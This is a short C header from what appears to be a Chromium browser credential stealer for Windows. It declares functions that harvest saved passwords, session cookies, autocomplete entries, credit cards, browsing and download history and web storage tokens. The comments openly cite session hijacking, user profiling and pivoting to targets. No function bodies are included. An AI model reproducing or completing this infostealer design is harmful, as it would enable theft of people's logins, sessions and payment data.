#ifndef CHROMIUM_H
#define CHROMIUM_H
#include <windows.h>

void BrowserInfo();      // Extract saved passwords
int HarvestPasswords(const char *loginDataPath, HMODULE hKernel32, DATA_BLOB decryptionKey);      // Extract saved passwords
int HarvestCookies(const char *cookieDataPath, HMODULE hKernel32, DATA_BLOB decryptionKey);          // Extract session cookies (often used for session hijacking)
int HarvestAutoComplete(const char *autoCompletePath, HMODULE hKernel32, DATA_BLOB decryptionKey);     // Grab autocomplete/form fill data (addresses, phones, etc.)
int HarvestHistory(const char *historyPath, HMODULE hKernel32, DATA_BLOB decryptionKey);   // Collect browsing history for user profiling and pivoting
int HarvestCreditCards(const char *webDataPath, HMODULE hKernel32, DATA_BLOB decryptionKey);       // Extract stored credit card info (encrypted, but valuable)
int HarvestDownloadHistory(const char *historyPath, HMODULE hKernel32, DATA_BLOB decryptionKey);  // Track downloads for identifying interesting targets/files
int HarvestBookmarks();        // Extract bookmarks (sometimes targets corporate URLs or resources) [TBI]
int HarvestExtensions();       // Enumerate installed extensions (some leak info or tokens) [TBI]
int HarvestLocalStorage();     // Extract localStorage data (may contain tokens, app state) [TBI]
int HarvestSessionStorage();   // Grab sessionStorage (temporary session tokens) [TBI]





#endif